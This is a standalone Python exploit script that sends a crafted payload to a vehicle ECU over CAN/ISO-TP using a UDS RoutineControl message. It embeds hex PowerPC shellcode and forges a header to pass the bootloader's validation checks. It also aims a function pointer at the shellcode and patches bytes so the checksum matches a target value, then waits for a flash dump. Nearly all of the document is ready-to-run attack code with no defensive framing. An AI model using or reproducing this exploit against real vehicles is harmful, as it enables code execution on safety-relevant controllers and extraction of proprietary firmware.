import can
import isotp
import time

CAN_INTERFACE = 'slcan'
CAN_CHANNEL = 'COM4' # UPDATE THIS
BITRATE = 500000
ECU_TX_ID = 0x7E0
ECU_RX_ID = 0x7E8

# The 100-byte shellcode from Step 1
SHELLCODE_HEX = "7C0802A6900100043DC0000061CE00003DE0002061EF00003E00007F621092003E4000006252243C3AA000FF9AB00005828E000092900001386000367E04837038A000FD7E4903A64E80042139CE00047DCE78404180FFDC800100047C0803A64E800020"

def calculate_checksum(data, seed=0xFAFCE69C):
    total = seed
    for i in range(0, len(data), 4):
        chunk = data[i:i+4].ljust(4, b'\xFF')
        w = int.from_bytes(chunk, 'big')
        # Byte-swapped additive sum
        swapped = ((w & 0xFF) << 24) | ((w & 0xFF00) << 8) | ((w >> 8) & 0xFF00) | (w >> 24)
        total = (total + swapped) & 0xFFFFFFFF
    return total

def build_payload():
    shellcode = bytes.fromhex(SHELLCODE_HEX)
    size = 0x3FFC  # The bootloader expects the buffer up to 0x7FD7FC
    buf = bytearray([0xFF] * size)

    # 1. Header (Must match the validation checks in Debounce_func_003988)
    uVar6 = 0x80
    buf[0] = uVar6
    buf[1] = ((uVar6 >> 4) | ((uVar6 & 0xF) << 4)) & 0xFF  # 0x08
    buf[2] = ((uVar6 >> 2) | ((uVar6 & 3) << 6)) & 0xFF    # 0x20
    buf[3] = 0x36 # Checksum byte (valid: 0x30, 0x35, 0x36)

    # 2. Function Pointer (Points to our shellcode at 0x7F9808)
    buf[4:8] = (0x7F9808).to_bytes(4, 'big')

    # 3. Insert Shellcode
    buf[8:8+len(shellcode)] = shellcode

    # 4. Fix the Checksum to 0xF7EAB8EE
    target = 0xF7EAB8EE
    current = calculate_checksum(buf)
    delta = (target - current) & 0xFFFFFFFF
    swapped_delta = ((delta & 0xFF) << 24) | ((delta & 0xFF00) << 8) | ((delta >> 8) & 0xFF00) | (delta >> 24)
    buf[-4:] = swapped_delta.to_bytes(4, 'big')

    return bytes(buf)

def main():
    payload = build_payload()
    
    # The CAN message must have a 0x16 byte header before the payload
    header = bytearray([0x00] * 0x16)
    header[0] = 0x31 # RoutineControl
    header[1] = 0x01
    
    full_message = header + payload
    
    # Ensure the header validation bytes match the payload
    full_message[0x16] = 0x80
    full_message[0x17] = 0x08
    full_message[0x18] = 0x20
    full_message[0x19] = 0x36
    
    # Set length in the header (UDS 0x31 format)
    length = len(full_message)
    full_message[2] = (length >> 8) & 0xFF
    full_message[3] = length & 0xFF
    
    print(f"Full message size: {length} bytes")
    print(f"Calculated checksum: 0x{calculate_checksum(payload):08X}")
    
    if calculate_checksum(payload) != 0xF7EAB8EE:
        print("[-] Checksum mismatch. Aborting.")
        return

    bus = can.interface.Bus(bustype=CAN_INTERFACE, channel=CAN_CHANNEL, bitrate=BITRATE)
    addr = isotp.Address(isotp.AddressingMode.Normal_11bits, txid=ECU_TX_ID, rxid=ECU_RX_ID)
    stack = isotp.CanStack(bus=bus, address=addr, params={'blocking_send': True})

    print("[TX] Sending RAM Bootloader Payload...")
    stack.send(bytearray(full_message))

    print("[*] Waiting for flash dump to start...")
    timeout = time.time() + 15.0
    while time.time() < timeout:
        stack.process()
        if stack.available():
            resp = stack.recv()
            print(f"[RX] {resp.hex().upper()}")
            break
        time.sleep(0.01)

if __name__ == "__main__":
    main()